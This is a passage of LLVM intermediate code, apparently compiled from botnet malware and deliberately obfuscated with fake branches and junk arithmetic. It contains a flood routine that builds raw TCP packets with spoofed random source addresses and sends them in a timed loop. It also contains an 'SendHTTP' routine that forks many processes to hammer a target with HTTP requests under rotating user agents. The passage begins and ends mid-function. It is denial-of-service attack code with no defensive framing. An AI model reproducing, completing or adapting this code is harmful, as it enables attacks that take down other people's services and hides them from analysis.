; <label>:531:                                    ; preds = %originalBBpart2177
  %532 = call i64 @time(i64* null) #5
  %533 = load i32, i32* %32, align 4
  %534 = sext i32 %533 to i64
  %535 = icmp sgt i64 %532, %534
  br i1 %535, label %536, label %537

; <label>:536:                                    ; preds = %531
  br label %573

; <label>:537:                                    ; preds = %531
  %538 = load i32, i32* @x.105
  %539 = load i32, i32* @y.106
  %540 = sub i32 %538, 1
  %541 = mul i32 %538, %540
  %542 = urem i32 %541, 2
  %543 = icmp eq i32 %542, 0
  %544 = icmp slt i32 %539, 10
  %545 = or i1 %543, %544
  br i1 %545, label %originalBB179, label %originalBB179alteredBB

originalBB179:                                    ; preds = %originalBB179alteredBB, %537
  store i32 0, i32* %33, align 4
  %546 = load i32, i32* @x.105
  %547 = load i32, i32* @y.106
  %548 = sub i32 %546, 1
  %549 = mul i32 %546, %548
  %550 = urem i32 %549, 2
  %551 = icmp eq i32 %550, 0
  %552 = icmp slt i32 %547, 10
  %553 = or i1 %551, %552
  br i1 %553, label %originalBBpart2181, label %originalBB179alteredBB

originalBBpart2181:                               ; preds = %originalBB179
  br label %468

; <label>:554:                                    ; preds = %originalBBpart2177
  %555 = load i32, i32* @x.105
  %556 = load i32, i32* @y.106
  %557 = sub i32 %555, 1
  %558 = mul i32 %555, %557
  %559 = urem i32 %558, 2
  %560 = icmp eq i32 %559, 0
  %561 = icmp slt i32 %556, 10
  %562 = or i1 %560, %561
  br i1 %562, label %originalBB183, label %originalBB183alteredBB

originalBB183:                                    ; preds = %originalBB183alteredBB, %554
  %563 = load i32, i32* %33, align 4
  %564 = add i32 %563, 1
  store i32 %564, i32* %33, align 4
  %565 = load i32, i32* @x.105
  %566 = load i32, i32* @y.106
  %567 = sub i32 %565, 1
  %568 = mul i32 %565, %567
  %569 = urem i32 %568, 2
  %570 = icmp eq i32 %569, 0
  %571 = icmp slt i32 %566, 10
  %572 = or i1 %570, %571
  br i1 %572, label %originalBBpart2197, label %originalBB183alteredBB

originalBBpart2197:                               ; preds = %originalBB183
  br label %468

; <label>:573:                                    ; preds = %536
  %574 = load i32, i32* @x.105
  %575 = load i32, i32* @y.106
  %576 = sub i32 %574, 1
  %577 = mul i32 %574, %576
  %578 = urem i32 %577, 2
  %579 = icmp eq i32 %578, 0
  %580 = icmp slt i32 %575, 10
  %581 = or i1 %579, %580
  br i1 %581, label %originalBB199, label %originalBB199alteredBB

originalBB199:                                    ; preds = %originalBB199alteredBB, %573
  %582 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %582)
  %583 = load i32, i32* @x.105
  %584 = load i32, i32* @y.106
  %585 = sub i32 %583, 1
  %586 = mul i32 %583, %585
  %587 = urem i32 %586, 2
  %588 = icmp eq i32 %587, 0
  %589 = icmp slt i32 %584, 10
  %590 = or i1 %588, %589
  br i1 %590, label %originalBBpart2201, label %originalBB199alteredBB

originalBBpart2201:                               ; preds = %originalBB199
  br label %591

; <label>:591:                                    ; preds = %originalBBpart2201, %originalBBpart212, %originalBBpart28, %76
  %592 = load i32, i32* @x.105
  %593 = load i32, i32* @y.106
  %594 = sub i32 %592, 1
  %595 = mul i32 %592, %594
  %596 = urem i32 %595, 2
  %597 = icmp eq i32 %596, 0
  %598 = icmp slt i32 %593, 10
  %599 = or i1 %597, %598
  br i1 %599, label %originalBB203, label %originalBB203alteredBB

originalBB203:                                    ; preds = %originalBB203alteredBB, %591
  %600 = load i32, i32* @x.105
  %601 = load i32, i32* @y.106
  %602 = sub i32 %600, 1
  %603 = mul i32 %600, %602
  %604 = urem i32 %603, 2
  %605 = icmp eq i32 %604, 0
  %606 = icmp slt i32 %601, 10
  %607 = or i1 %605, %606
  br i1 %607, label %originalBBpart2205, label %originalBB203alteredBB

originalBBpart2205:                               ; preds = %originalBB203
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %7
  %608 = alloca i8*, align 8
  %609 = alloca i32, align 4
  %610 = alloca i32, align 4
  %611 = alloca i8*, align 8
  %612 = alloca i32, align 4
  %613 = alloca i32, align 4
  %614 = alloca i32, align 4
  %615 = alloca i32, align 4
  %616 = alloca %struct.sockaddr_in, align 4
  %617 = alloca i32, align 4
  %618 = alloca i32, align 4
  %619 = alloca i32, align 4
  %620 = alloca i8*, align 8
  %621 = alloca %struct.iphdr*, align 8
  %622 = alloca %struct.tcphdr*, align 8
  %623 = alloca i8*, align 8
  %624 = alloca i32, align 4
  %625 = alloca i32, align 4
  store i8* %0, i8** %608, align 8
  store i32 %1, i32* %609, align 4
  store i32 %2, i32* %610, align 4
  store i8* %3, i8** %611, align 8
  store i32 %4, i32* %612, align 4
  store i32 %5, i32* %613, align 4
  store i32 %6, i32* %614, align 4
  %626 = load i32, i32* %613, align 4
  store i32 %626, i32* %615, align 4
  %627 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %616, i32 0, i32 0
  store i16 2, i16* %627, align 4
  %628 = load i32, i32* %609, align 4
  %629 = icmp eq i32 %628, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  %630 = call i32 @rand_cmwc()
  %631 = trunc i32 %630 to i16
  %632 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %631, i16* %632, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %83
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %105
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %132
  %633 = load i32, i32* %20, align 4
  %634 = sext i32 %633 to i64
  %_ = sub i64 40, %634
  %gen = mul i64 %_, %634
  %_15 = sub i64 0, 40
  %gen16 = add i64 %_15, %634
  %_17 = sub i64 0, 40
  %gen18 = add i64 %_17, %634
  %_19 = sub i64 40, %634
  %gen20 = mul i64 %_19, %634
  %_21 = sub i64 40, %634
  %gen22 = mul i64 %_21, %634
  %635 = add i64 40, %634
  %636 = call i8* @llvm.stacksave()
  store i8* %636, i8** %28, align 8
  %637 = alloca i8, i64 %635, align 16
  %638 = bitcast i8* %637 to %struct.iphdr*
  store %struct.iphdr* %638, %struct.iphdr** %29, align 8
  %639 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %640 = bitcast %struct.iphdr* %639 to i8*
  %641 = getelementptr i8, i8* %640, i64 20
  %642 = bitcast i8* %641 to %struct.tcphdr*
  store %struct.tcphdr* %642, %struct.tcphdr** %30, align 8
  %643 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %644 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %645 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %644, i32 0, i32 0
  %646 = load i32, i32* %645, align 4
  %647 = load i32, i32* %27, align 4
  %648 = call i32 @getRandomIP(i32 %647)
  %649 = call i32 @htonl(i32 %648) #10
  %650 = load i32, i32* %20, align 4
  %651 = sext i32 %650 to i64
  %_23 = sub i64 0, 20
  %gen24 = add i64 %_23, %651
  %_25 = sub i64 20, %651
  %gen26 = mul i64 %_25, %651
  %_27 = sub i64 20, %651
  %gen28 = mul i64 %_27, %651
  %_29 = shl i64 20, %651
  %652 = add i64 20, %651
  %653 = trunc i64 %652 to i32
  call void @makeIPPacket(%struct.iphdr* %643, i32 %646, i32 %649, i8 zeroext 6, i32 %653)
  %654 = call i32 @rand_cmwc()
  %655 = trunc i32 %654 to i16
  %656 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %657 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %656, i32 0, i32 0
  %658 = bitcast %union.anon* %657 to %struct.anon.0*
  %659 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %658, i32 0, i32 0
  store i16 %655, i16* %659, align 4
  %660 = call i32 @rand_cmwc()
  %661 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %662 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %661, i32 0, i32 0
  %663 = bitcast %union.anon* %662 to %struct.anon.0*
  %664 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %663, i32 0, i32 2
  store i32 %660, i32* %664, align 4
  %665 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %666 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %665, i32 0, i32 0
  %667 = bitcast %union.anon* %666 to %struct.anon.0*
  %668 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %667, i32 0, i32 3
  store i32 0, i32* %668, align 4
  %669 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %670 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %669, i32 0, i32 0
  %671 = bitcast %union.anon* %670 to %struct.anon.0*
  %672 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %671, i32 0, i32 4
  %673 = load i16, i16* %672, align 4
  %_30 = sub i16 0, %673
  %gen31 = add i16 %_30, -241
  %_32 = sub i16 %673, -241
  %gen33 = mul i16 %_32, -241
  %_34 = shl i16 %673, -241
  %_35 = shl i16 %673, -241
  %_36 = sub i16 0, %673
  %gen37 = add i16 %_36, -241
  %674 = and i16 %673, -241
  %_38 = sub i16 0, %674
  %gen39 = add i16 %_38, 80
  %_40 = sub i16 0, %674
  %gen41 = add i16 %_40, 80
  %_42 = shl i16 %674, 80
  %_43 = sub i16 0, %674
  %gen44 = add i16 %_43, 80
  %675 = or i16 %674, 80
  store i16 %675, i16* %672, align 4
  %676 = load i8*, i8** %19, align 8
  %677 = call i32 @strcmp(i8* %676, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.914, i32 0, i32 0)) #9
  %678 = icmp ne i32 %677, 0
  br label %originalBB14

originalBB48alteredBB:                            ; preds = %originalBB48, %195
  %679 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %680 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %679, i32 0, i32 0
  %681 = bitcast %union.anon* %680 to %struct.anon.0*
  %682 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %681, i32 0, i32 4
  %683 = load i16, i16* %682, align 4
  %_49 = sub i16 %683, -513
  %gen50 = mul i16 %_49, -513
  %_51 = sub i16 0, %683
  %gen52 = add i16 %_51, -513
  %_53 = sub i16 0, %683
  %gen54 = add i16 %_53, -513
  %_55 = sub i16 0, %683
  %gen56 = add i16 %_55, -513
  %_57 = sub i16 %683, -513
  %gen58 = mul i16 %_57, -513
  %_59 = shl i16 %683, -513
  %_60 = shl i16 %683, -513
  %684 = and i16 %683, -513
  %_61 = sub i16 %684, 512
  %gen62 = mul i16 %_61, 512
  %_63 = sub i16 %684, 512
  %gen64 = mul i16 %_63, 512
  %_65 = shl i16 %684, 512
  %_66 = sub i16 0, %684
  %gen67 = add i16 %_66, 512
  %_68 = shl i16 %684, 512
  %_69 = shl i16 %684, 512
  %_70 = shl i16 %684, 512
  %685 = or i16 %684, 512
  store i16 %685, i16* %682, align 4
  %686 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %687 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %686, i32 0, i32 0
  %688 = bitcast %union.anon* %687 to %struct.anon.0*
  %689 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %688, i32 0, i32 4
  %690 = load i16, i16* %689, align 4
  %_71 = sub i16 %690, -1025
  %gen72 = mul i16 %_71, -1025
  %_73 = sub i16 0, %690
  %gen74 = add i16 %_73, -1025
  %_75 = sub i16 0, %690
  %gen76 = add i16 %_75, -1025
  %691 = and i16 %690, -1025
  %_77 = sub i16 %691, 1024
  %gen78 = mul i16 %_77, 1024
  %_79 = sub i16 0, %691
  %gen80 = add i16 %_79, 1024
  %_81 = shl i16 %691, 1024
  %_82 = sub i16 0, %691
  %gen83 = add i16 %_82, 1024
  %692 = or i16 %691, 1024
  store i16 %692, i16* %689, align 4
  %693 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %694 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %693, i32 0, i32 0
  %695 = bitcast %union.anon* %694 to %struct.anon.0*
  %696 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %695, i32 0, i32 4
  %697 = load i16, i16* %696, align 4
  %_84 = sub i16 0, %697
  %gen85 = add i16 %_84, -257
  %_86 = sub i16 0, %697
  %gen87 = add i16 %_86, -257
  %_88 = sub i16 %697, -257
  %gen89 = mul i16 %_88, -257
  %_90 = sub i16 %697, -257
  %gen91 = mul i16 %_90, -257
  %_92 = shl i16 %697, -257
  %698 = and i16 %697, -257
  %_93 = sub i16 0, %698
  %gen94 = add i16 %_93, 256
  %_95 = sub i16 %698, 256
  %gen96 = mul i16 %_95, 256
  %_97 = shl i16 %698, 256
  %699 = or i16 %698, 256
  store i16 %699, i16* %696, align 4
  %700 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %701 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %700, i32 0, i32 0
  %702 = bitcast %union.anon* %701 to %struct.anon.0*
  %703 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %702, i32 0, i32 4
  %704 = load i16, i16* %703, align 4
  %_98 = sub i16 0, %704
  %gen99 = add i16 %_98, -4097
  %_100 = sub i16 0, %704
  %gen101 = add i16 %_100, -4097
  %705 = and i16 %704, -4097
  %_102 = sub i16 0, %705
  %gen103 = add i16 %_102, 4096
  %_104 = sub i16 0, %705
  %gen105 = add i16 %_104, 4096
  %706 = or i16 %705, 4096
  store i16 %706, i16* %703, align 4
  %707 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %708 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %707, i32 0, i32 0
  %709 = bitcast %union.anon* %708 to %struct.anon.0*
  %710 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %709, i32 0, i32 4
  %711 = load i16, i16* %710, align 4
  %_106 = sub i16 0, %711
  %gen107 = add i16 %_106, -2049
  %_108 = shl i16 %711, -2049
  %_109 = sub i16 %711, -2049
  %gen110 = mul i16 %_109, -2049
  %712 = and i16 %711, -2049
  %_111 = sub i16 0, %712
  %gen112 = add i16 %_111, 2048
  %713 = or i16 %712, 2048
  store i16 %713, i16* %710, align 4
  br label %originalBB48

originalBB116alteredBB:                           ; preds = %originalBB116, %265
  %714 = load i8*, i8** %31, align 8
  %715 = call i32 @strcmp(i8* %714, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.917, i32 0, i32 0)) #9
  %716 = icmp ne i32 %715, 0
  br label %originalBB116

originalBB120alteredBB:                           ; preds = %originalBB120, %285
  %717 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %718 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %717, i32 0, i32 0
  %719 = bitcast %union.anon* %718 to %struct.anon.0*
  %720 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %719, i32 0, i32 4
  %721 = load i16, i16* %720, align 4
  %_121 = sub i16 0, %721
  %gen122 = add i16 %_121, -1025
  %_123 = sub i16 0, %721
  %gen124 = add i16 %_123, -1025
  %_125 = sub i16 0, %721
  %gen126 = add i16 %_125, -1025
  %_127 = sub i16 %721, -1025
  %gen128 = mul i16 %_127, -1025
  %_129 = sub i16 0, %721
  %gen130 = add i16 %_129, -1025
  %_131 = sub i16 0, %721
  %gen132 = add i16 %_131, -1025
  %_133 = sub i16 0, %721
  %gen134 = add i16 %_133, -1025
  %_135 = shl i16 %721, -1025
  %722 = and i16 %721, -1025
  %_136 = sub i16 0, %722
  %gen137 = add i16 %_136, 1024
  %723 = or i16 %722, 1024
  store i16 %723, i16* %720, align 4
  br label %originalBB120

originalBB141alteredBB:                           ; preds = %originalBB141, %337
  %724 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %725 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %724, i32 0, i32 0
  %726 = bitcast %union.anon* %725 to %struct.anon.0*
  %727 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %726, i32 0, i32 4
  %728 = load i16, i16* %727, align 4
  %_142 = sub i16 0, %728
  %gen143 = add i16 %_142, -2049
  %_144 = sub i16 0, %728
  %gen145 = add i16 %_144, -2049
  %_146 = sub i16 0, %728
  %gen147 = add i16 %_146, -2049
  %_148 = sub i16 %728, -2049
  %gen149 = mul i16 %_148, -2049
  %_150 = shl i16 %728, -2049
  %_151 = shl i16 %728, -2049
  %729 = and i16 %728, -2049
  %_152 = sub i16 %729, 2048
  %gen153 = mul i16 %_152, 2048
  %_154 = sub i16 %729, 2048
  %gen155 = mul i16 %_154, 2048
  %_156 = sub i16 0, %729
  %gen157 = add i16 %_156, 2048
  %_158 = sub i16 %729, 2048
  %gen159 = mul i16 %_158, 2048
  %730 = or i16 %729, 2048
  store i16 %730, i16* %727, align 4
  br label %originalBB141

originalBB163alteredBB:                           ; preds = %originalBB163, %361
  br label %originalBB163

originalBB167alteredBB:                           ; preds = %originalBB167, %379
  br label %originalBB167

originalBB171alteredBB:                           ; preds = %originalBB171, %420
  %731 = load i32, i32* %17, align 4
  %732 = trunc i32 %731 to i16
  %733 = call zeroext i16 @htons(i16 zeroext %732) #10
  %734 = zext i16 %733 to i32
  br label %originalBB171

originalBB175alteredBB:                           ; preds = %originalBB175, %469
  %735 = load i32, i32* %25, align 4
  %736 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  %737 = call i64 @sendto(i32 %735, i8* %145, i64 %143, i32 0, %struct.sockaddr* %736, i32 16)
  %738 = load i32, i32* %27, align 4
  %739 = call i32 @getRandomIP(i32 %738)
  %740 = call i32 @htonl(i32 %739) #10
  %741 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %742 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %741, i32 0, i32 8
  store i32 %740, i32* %742, align 4
  %743 = call i32 @rand_cmwc()
  %744 = trunc i32 %743 to i16
  %745 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %746 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %745, i32 0, i32 3
  store i16 %744, i16* %746, align 4
  %747 = call i32 @rand_cmwc()
  %748 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %749 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %748, i32 0, i32 0
  %750 = bitcast %union.anon* %749 to %struct.anon.0*
  %751 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %750, i32 0, i32 2
  store i32 %747, i32* %751, align 4
  %752 = call i32 @rand_cmwc()
  %753 = trunc i32 %752 to i16
  %754 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %755 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %754, i32 0, i32 0
  %756 = bitcast %union.anon* %755 to %struct.anon.0*
  %757 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %756, i32 0, i32 0
  store i16 %753, i16* %757, align 4
  %758 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %759 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %758, i32 0, i32 0
  %760 = bitcast %union.anon* %759 to %struct.anon.0*
  %761 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %760, i32 0, i32 6
  store i16 0, i16* %761, align 4
  %762 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %763 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %764 = call zeroext i16 @tcpcsum(%struct.iphdr* %762, %struct.tcphdr* %763)
  %765 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %766 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %765, i32 0, i32 0
  %767 = bitcast %union.anon* %766 to %struct.anon.0*
  %768 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %767, i32 0, i32 6
  store i16 %764, i16* %768, align 4
  %769 = bitcast i8* %145 to i16*
  %770 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %771 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %770, i32 0, i32 2
  %772 = load i16, i16* %771, align 2
  %773 = zext i16 %772 to i32
  %774 = call zeroext i16 @csum(i16* %769, i32 %773)
  %775 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %776 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %775, i32 0, i32 7
  store i16 %774, i16* %776, align 2
  %777 = load i32, i32* %33, align 4
  %778 = load i32, i32* %23, align 4
  %779 = icmp eq i32 %777, %778
  br label %originalBB175

originalBB179alteredBB:                           ; preds = %originalBB179, %537
  store i32 0, i32* %33, align 4
  br label %originalBB179

originalBB183alteredBB:                           ; preds = %originalBB183, %554
  %780 = load i32, i32* %33, align 4
  %_184 = shl i32 %780, 1
  %_185 = sub i32 %780, 1
  %gen186 = mul i32 %_185, 1
  %_187 = sub i32 %780, 1
  %gen188 = mul i32 %_187, 1
  %_189 = sub i32 0, %780
  %gen190 = add i32 %_189, 1
  %_191 = shl i32 %780, 1
  %_192 = sub i32 %780, 1
  %gen193 = mul i32 %_192, 1
  %_194 = sub i32 0, %780
  %gen195 = add i32 %_194, 1
  %781 = add i32 %780, 1
  store i32 %781, i32* %33, align 4
  br label %originalBB183

originalBB199alteredBB:                           ; preds = %originalBB199, %573
  %782 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %782)
  br label %originalBB199

originalBB203alteredBB:                           ; preds = %originalBB203, %591
  br label %originalBB203
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #5
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #10
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #5
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = load i32, i32* @x.109
  %8 = load i32, i32* @y.110
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca [512 x i8], align 16
  %26 = alloca [1 x i8], align 1
  store i8* %0, i8** %15, align 8
  store i8* %1, i8** %16, align 8
  store i16 %2, i16* %17, align 2
  store i8* %3, i8** %18, align 8
  store i32 %4, i32* %19, align 4
  store i32 %5, i32* %20, align 4
  %27 = call i64 @time(i64* null) #5
  %28 = load i32, i32* %19, align 4
  %29 = sext i32 %28 to i64
  %30 = add nsw i64 %27, %29
  %31 = trunc i64 %30 to i32
  store i32 %31, i32* %23, align 4
  store i32 0, i32* %24, align 4
  store i32 0, i32* %22, align 4
  %32 = load i32, i32* @x.109
  %33 = load i32, i32* @y.110
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %99, %originalBBpart2
  %41 = load i32, i32* %22, align 4
  %42 = load i32, i32* %20, align 4
  %43 = icmp slt i32 %41, %42
  br i1 %43, label %44, label %102

; <label>:44:                                     ; preds = %40
  %45 = getelementptr inbounds [512 x i8], [512 x i8]* %25, i32 0, i32 0
  %46 = load i8*, i8** %15, align 8
  %47 = load i8*, i8** %18, align 8
  %48 = load i8*, i8** %16, align 8
  %49 = call i32 @rand() #5
  %50 = srem i32 %49, 36
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [108 x i8*], [108 x i8*]* @useragents, i64 0, i64 %51
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 (i8*, i8*, ...) @sprintf(i8* %45, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.921, i32 0, i32 0), i8* %46, i8* %47, i8* %48, i8* %53) #5
  %55 = call i32 @fork() #5
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %98

; <label>:57:                                     ; preds = %44
  br label %58

; <label>:58:                                     ; preds = %originalBBpart215, %57
  %59 = load i32, i32* %23, align 4
  %60 = sext i32 %59 to i64
  %61 = call i64 @time(i64* null) #5
  %62 = icmp sgt i64 %60, %61
  br i1 %62, label %63, label %97

; <label>:63:                                     ; preds = %58
  %64 = load i8*, i8** %16, align 8
  %65 = load i16, i16* %17, align 2
  %66 = call i32 @socket_connect(i8* %64, i16 zeroext %65)
  store i32 %66, i32* %21, align 4
  %67 = load i32, i32* %21, align 4
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %69, label %80

; <label>:69:                                     ; preds = %63
  %70 = load i32, i32* %21, align 4
  %71 = getelementptr inbounds [512 x i8], [512 x i8]* %25, i32 0, i32 0
  %72 = getelementptr inbounds [512 x i8], [512 x i8]* %25, i32 0, i32 0
  %73 = call i64 @strlen(i8* %72) #9
  %74 = call i64 @write(i32 %70, i8* %71, i64 %73)
  %75 = load i32, i32* %21, align 4
  %76 = getelementptr inbounds [1 x i8], [1 x i8]* %26, i32 0, i32 0
  %77 = call i64 @read(i32 %75, i8* %76, i64 1)
  %78 = load i32, i32* %21, align 4
  %79 = call i32 @close(i32 %78)
  br label %80

; <label>:80:                                     ; preds = %69, %63
  %81 = load i32, i32* @x.109
  %82 = load i32, i32* @y.110
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %80
  %89 = load i32, i32* @x.109
  %90 = load i32, i32* @y.110
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br label %58

; <label>:97:                                     ; preds = %58
  call void @exit(i32 0) #11
  unreachable

; <label>:98:                                     ; preds = %44
  br label %99

; <label>:99:                                     ; preds = %98
  %100 = load i32, i32* %22, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %22, align 4
  br label %40

; <label>:102:                                    ; preds = %40
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %6
  %103 = alloca i8*, align 8
  %104 = alloca i8*, align 8
  %105 = alloca i16, align 2
  %106 = alloca i8*, align 8
  %107 = alloca i32, align 4
  %108 = alloca i32, align 4
  %109 = alloca i32, align 4
  %110 = alloca i32, align 4
